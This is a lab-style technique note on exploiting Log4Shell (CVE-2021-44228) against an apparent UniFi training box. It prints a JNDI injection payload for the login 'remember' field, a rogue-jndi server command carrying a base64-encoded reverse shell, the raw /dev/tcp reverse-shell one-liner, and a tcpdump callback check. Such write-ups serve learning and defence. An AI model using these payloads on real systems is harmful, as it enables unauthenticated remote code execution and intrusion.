---
tags: [technique, foothold, rce, java]
cve: CVE-2021-44228
aliases: [Log4j, JNDI Injection, CVE-2021-44228]
---
# Log4Shell (CVE-2021-44228)

> Any attacker-controlled string that gets logged by a vulnerable Log4j 2 can trigger a JNDI lookup → remote Java class loading → **unauthenticated RCE**. Delivered by placing `${jndi:ldap://<attacker-ip>:1389/x}` into any field the server logs.

## Why it works – the chain of design decisions
1. Log4j evaluates `${...}` placeholders inside **logged strings** and substitutes real values (`${java:version}`, `${env:USER}`, …).
2. It also allows the `jndi:` lookup → "fetch whatever is registered under this address".
3. [[JNDI]] resolves objects **over the network**, not just locally.
4. JNDI/LDAP permits **remote object loading** → loading a remote Java class.
5. Java **executes** that class.

> An attacker whose input is logged anywhere can run arbitrary code.

## Delivery
- the payload goes into **any field that reaches the log** → the field is application-specific (on Unified it is the `remember` field of `POST /api/login`)
- a user/password login with bad credentials is enough → the string is logged before auth completes
```json
{"username":"test","password":"test","remember":"${jndi:ldap://<attacker-ip>:1389/o=tomcat}","strict":true}
```
- the request is intercepted and edited in [[Burp Suite]] (→ sent to Repeater for payload iteration), or sent directly with `curl -k`

## Exploit server → [[rogue-jndi]]
rogue-jndi runs a malicious LDAP server (with a paired HTTP server) that answers the target's lookup with a reference to a Java class carrying my command.
```bash
# reverse-shell command, base64-encoded (see below)
java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,<base64>}|{base64,-d}|{bash,-i}" \
  --hostname "<attacker-ip>"
```
Flow:
```
target queries LDAP :1389   →  rogue-jndi: "load class from :8000"
target fetches HTTP :8000    →  rogue-jndi: serves Java class with my command
target runs the class        →  bash connects back to my nc :9001
```

## Why base64-encode the command
- the `--command` string is embedded into a Java class → special characters (`/`, `>`, `&`) break it
- the reverse-shell one-liner is base64-encoded so it survives intact, then decoded on the target
```bash
echo 'bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1' | base64
# → feed into {echo,<base64>}|{base64,-d}|{bash,-i}
```
→ one-liner reference: [[Reverse Shell]], listener: [[netcat]]

## Confirming the callback → [[tcpdump]]
The incoming LDAP lookup confirms the target is vulnerable before the full exploit is served.
```bash
sudo tcpdump -i tun0 port 389
# 13:37:00 IP <box>.xxxxx > <attacker-ip>.389: LDAP   → target reached me = vulnerable
```

## Fix
- patched Log4j disables JNDI lookups by default → vulnerable versions are the old UniFi/Log4j builds (Unified ships 6.4.54)

Related: [[JNDI]] · [[rogue-jndi]] · [[Burp Suite]] · [[tcpdump]] · [[Reverse Shell]] · [[netcat]]
